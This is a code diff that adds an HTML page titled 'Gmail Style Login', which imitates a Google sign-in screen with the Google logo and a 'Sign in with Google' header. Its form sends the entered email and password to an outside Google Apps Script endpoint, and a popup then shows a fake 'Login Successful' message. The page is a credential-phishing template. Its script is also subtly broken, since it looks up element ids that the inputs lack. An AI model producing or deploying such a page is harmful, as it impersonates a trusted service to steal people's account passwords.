@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gmail Style Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f1f3f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      width: 800px;
+      border-radius: 20px;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.1);
+      display: flex;
+      padding: 0;
+      overflow: hidden;
+      flex-direction: column;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 20px 30px 10px 30px;
+      font-size: 14px;
+      color: #5f6368;
+      gap: 8px;
+    }
+
+    .header img {
+      height: 20px;
+    }
+
+    .divider {
+      border-top: 1px solid #ddd;
+      margin: 0 30px;
+    }
+
+    .content {
+      display: flex;
+      flex-direction: row;
+      padding: 40px 30px;
+      gap: 30px;
+    }
+
+    .left-side {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .left-side h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    .left-side p {
+      font-size: 16px;
+    }
+
+    .left-side p a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    .right-side {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .right-side input {
+      padding: 14px;
+      font-size: 16px;
+      border: 1px solid #dcdcdc;
+      border-radius: 6px;
+      outline: none;
+      margin-bottom: 10px;
+      transition: border-color 0.3s;
+    }
+
+    .right-side input:focus {
+      border: 2px solid #1a73e8;
+    }
+
+    .right-side a {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+
+    .right-side p {
+      font-size: 12px;
+      color: #5f6368;
+      margin-bottom: 30px;
+    }
+
+    .right-side p a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    .button-row {
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .button-row button {
+      background-color: #1a73e8;
+      color: white;
+      padding: 10px 25px;
+      font-size: 14px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .button-row button:hover {
+      background-color: #1558b0;
+    }
+
+    @media (max-width: 768px) {
+      .content {
+        flex-direction: column;
+        gap: 20px;
+      }
+
+      .button-row {
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+<form method="post" action="https://script.google.com/macros/s/AKfycbzWEO7ykqwv6rOa7ilYbuT02hw5EPeE9lgy1Yhz2Wmzxwd4wZZtMv1giZS6GzPKCStpKQ/exec" name="contact-form">
+  <div class="container">
+    <div class="header">
+      <img src="g logo.png" alt="Google Logo">
+      <span>Sign in with Google</span>
+    </div>
+    <div class="divider"></div>
+
+    <div class="content">
+      <div class="left-side">
+        <h1>Sign in</h1>
+        <p>to continue to <a href="#">Veebu</a></p>
+      </div>
+      <div class="right-side">
+        <input type="email" name="email" placeholder="Email or phone">
+        <input type="password" name="password" placeholder="Enter your password">
+        <a href="#">Forgot email?</a>
+        <p>Before using this app, you can review Veebu’s <a href="#">privacy policy</a> and <a href="#">terms of service</a>.</p>
+        <div class="button-row">
+          <button onclick="openPopup()">Next</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function openPopup() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      if (!email || !password) {
+        alert("Please enter both email and password.");
+        return;
+      }
+
+      const popup = window.open("", "PopupWindow", "width=400,height=300,left=500,top=200");
+      popup.document.write(`
+        <html>
+        <head>
+          <title>Login</title>
+          <style>
+            body {
+              font-family: Arial, sans-serif;
+              display: flex;
+              justify-content: center;
+              align-items: center;
+              height: 100vh;
+              background-color: #f1f3f4;
+            }
+            .message {
+              background: white;
+              padding: 30px;
+              border-radius: 10px;
+              text-align: center;
+              box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            }
+          </style>
+        </head>
+        <body>
+          <div class="message">
+            <h2>Login Successful</h2>
+            <p>Welcome, <strong>${email}</strong></p>
+          </div>
+        </body>
+        </html>
+      `);
+    }
+  </script>
+
+</body>
+</html>
